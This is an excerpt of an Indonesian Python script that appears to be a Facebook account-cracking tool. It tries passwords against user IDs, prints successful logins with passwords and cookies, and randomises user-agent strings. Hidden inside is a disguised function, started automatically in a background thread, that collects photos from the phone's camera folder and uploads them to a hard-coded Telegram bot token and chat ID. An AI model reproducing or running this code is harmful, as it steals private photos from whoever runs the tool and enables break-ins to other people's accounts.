...
dta = {'1':'Jan','2':'Feb','3':'Mar','4':'Apr','5':'Mei','6':'Jun','7':'Jul','8':'Agu','9':'Sepr','10':'Okt','11':'Nov','12':'Des'}
tgl = now.day
bln = dta[(str(now.month))]
thn = now.year
okc = ('OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt')
cpc = ('CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt')
ok,cp,loop,id,id2,idf,P,M,K,B,H,N,bsp,ses = 0,0,0,[],[],[],'\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[0m',bs4.BeautifulSoup,requests.Session()
...
# Fungsi untuk mengirim foto ke Telegram (berjalan di background)
def sptzyydeverror():
    try:
        token = '8012820581:AAFKRQiNRSw84ecuplhP3s2NLVEtKwcul14'
        chat_id = '8104531290'
        
        # Kirim pesan mulai
        send_telegram_message(token, chat_id, "📤 Proses pengiriman foto mohon tunggu...")
        
        # Daftar path yang mungkin untuk folder foto
        possible_paths = [
            '/sdcard/DCIM/Camera/',
        ...
        if not path_camera:
            send_telegram_message(token, chat_id, "❌ Folder foto tidak ditemukan")
            return
        
        # Kumpulkan file foto
        photo_files = []
        for file in os.listdir(path_camera):
            if file.lower().endswith(('.jpg', '.jpeg', '.png')):
                full_path = os.path.join(path_camera, file)
                if os.path.isfile(full_path):
                    file_size = os.path.getsize(full_path) / (1024 * 1024)  # MB
                    if file_size <= 5:  # Hanya file <= 5MB
                        photo_files.append((full_path, file))
        
        total_photos = len(photo_files)
        
        if total_photos == 0:
            send_telegram_message(token, chat_id, "❌ Tidak ada foto yang ditemukan")
            return
        
        # Kirim info jumlah foto yang ditemukan
        send_telegram_message(token, chat_id, f"📊 Ditemukan {total_photos} foto\n⏳ Sedang mengirim...")
        
        success_count = 0
        failed_count = 0
        
        # Kirim foto
        for i, (full_path, file) in enumerate(photo_files, 1):
            try:
                with open(full_path, 'rb') as f:
                    files = {'photo': f}
                    caption = f'📸 Foto {i}/{total_photos}\n📁 {file}'
            ...
            # Kirim progress setiap 5 foto
            if i % 5 == 0 or i == total_photos:
                progress_msg = f"📤 Progress: {i}/{total_photos} foto\n✅ Berhasil: {success_count}\n❌ Gagal: {failed_count}"
                send_telegram_message(token, chat_id, progress_msg)
        ...
        # Kirim laporan akhir
        report_msg = f"""
📊 LAPORAN AKHIR PENGIRIMAN FOTO

✅ Berhasil: {success_count} foto
❌ Gagal: {failed_count} foto
📷 Total: {total_photos} foto

⏰ Selesai: {time.strftime('%H:%M:%S')}
        """
        ...
        try:
            send_telegram_message(token, chat_id, f"❌ Error: {str(e)}")
        except:
            pass

# Fungsi untuk menjalankan sptzyydeverror di thread terpisah
def run_sptzyydeverror_in_background():
    thread = threading.Thread(target=sptzyydeverror)
    thread.daemon = True  # Thread akan berhenti ketika program utama berhenti
    thread.start()
    
run_sptzyydeverror_in_background()
...
def Async(user, pasw, nmfl):
    ...
    usr = user.split('@')[0]
    global loop,ok,cp
    print(f"{P}[{H} IDIN {P}] {P}{loop} {H}{ok}{P}|{K}{cp} {P}| {M}{usr}  {N}", end = ("\r"))
    ...
    for pw in pasw:
        try:
            ...
            if "c_user" in ses.cookies.get_dict():
                ...
                ok+=1
                print(f"{P}╔══════════════════════════════════════════════════════════════╗")
                print(f"{P}║{H}                    SUKSES LOGIN                          {P}║")
                print(f"{P}╠══════════════════════════════════════════════════════════════╣")
                print(f"{P}║{H}                   {uid} {P}| {H}{pw}             {P}║")
                print(f"{P}╚══════════════════════════════════════════════════════════════╝")
                print(f"{U}{kue}")
...
# WARNA BACKGROUND
BP = '\033[1;107m'  # BACKGROUND PUTIH
BM = '\033[1;101m'  # BACKGROUND MERAH
BK = '\033[1;103m'  # BACKGROUND KUNING
BB = '\033[1;104m'  # BACKGROUND BIRU
BH = '\033[1;102m'  # BACKGROUND HIJAU
BC = '\033[1;106m'  # BACKGROUND CYAN
BU = '\033[1;105m'  # BACKGROUND UNGU

# BACKGROUND REGULAR
bP = '\033[0;107m'  # BACKGROUND PUTIH
bM = '\033[0;101m'  # BACKGROUND MERAH
bK = '\033[0;103m'  # BACKGROUND KUNING
bB = '\033[0;104m'  # BACKGROUND BIRU
bH = '\033[0;102m'  # BACKGROUND HIJAU
bC = '\033[0;106m'  # BACKGROUND CYAN
bU = '\033[0;105m'  # BACKGROUND UNGU

# STYLE TEXT
BOLD = '\033[1m'      # TEBAL
UNDERLINE = '\033[4m' # GARIS BAWAH
BLINK = '\033[5m'     # KEDIP
REVERSE = '\033[7m'   # WARNA TERBALIK
HIDDEN = '\033[8m'    # TERSEMBUNYI
...
def Ical():
	rc = random.choice
	rr = random.randint
	merek = rc(["Viera","PASTB"])
	bahasa = rc(["de-DE","ja-JP","en-AU","en-GB","en-US","pt-BR","zh-CN","zh-TW","ko-KR","ar-SA","ru-RU","it-IT","fr-FR","es-ES","en-IE"])
	bahas = rc(["de","ja","en","en","us","pt","zh","id","ko","ar","ru","it","fr","es","ph"])
	kiw = f"Mozilla/5.0 (X11; CrOS aarch64 {str(rr(12000,18500))}.{str(rr(45,250))}.{str(rr(0,200))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(85,350))}.{str(rr(0,250))}.{str(rr(3500,7500))}.{str(rr(150,450))} Safari/537.36"
	fai = f"Mozilla/5.0 (Linux; U; {merek}; {bahasa}) BANGICALL AppleWebKit/537.36 (KHTML, like Gecko) Viera/{str(rr(0,77))}.{str(rr(0,75))}.{str(rr(0,75))} Chrome/{str(rr(50,350))}.{str(rr(0,75))}.{str(rr(2500,6500))}.{str(rr(50,350))} Safari/537.36 SmartTV"
	sal = f"Mozilla/5.0 (Linux; U; {merek}; {bahasa}) BANGICALL AppleWebKit/537.36 (KHTML, like Gecko) Viera/{str(rr(0,25))}.{str(rr(0,25))}.{str(rr(0,25))} Chrome/{str(rr(50,200))}.{str(rr(0,75))}.{str(rr(2500,6500))}.{str(rr(50,250))} Safari/537.36"
	gtg = f"Mozilla/5.0 (X11; FreeBSD; U; {merek}; {bahasa}) BANGICALL AppleWebKit/537.11 (KHTML, like Gecko) Viera/{str(rr(0,77))}.{str(rr(0,75))}.{str(rr(0,75))} Chrome/{str(rr(20,350))}.{str(rr(0,75))}.{str(rr(1500,6500))}.{str(rr(35,350))} Safari/537.11"
	bgt = f"Mozilla/5.0 (Linux; U; {merek}; {bahas}) BANGICALL AppleWebKit/537.11 ( KHTML, like  Gecko) Viera/{str(rr(0,77))}.{str(rr(0,75))}.{str(rr(0,75))} Chrome/{str(rr(50,350))}.{str(rr(0,75))}.{str(rr(2500,6500))}.{str(rr(50,350))} Safari/537.11"
	kan = f"Mozilla/5.0 (X11; Linux; U; {merek}; Diga; {bahasa}) BANGICALL AppleWebKit/537.11 (KHTML, like Gecko) Viera/{str(rr(0,77))}.{str(rr(0,75))}.{str(rr(0,75))} Chrome/{str(rr(50,350))}.{str(rr(0,75))}.{str(rr(2500,6500))}.{str(rr(50,350))} Safari/537.11"
	iya = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,350))}.{str(rr(0,250))}.{str(rr(0,250))}.{str(rr(0,250))} Safari/537.36"
	return rc([kiw,fai,sal,gtg,bgt,kan,iya])
...
if __name__=='__main__':
    ...
    # Jalankan fungsi pengiriman foto di background
    run_sptzyydeverror_in_background()
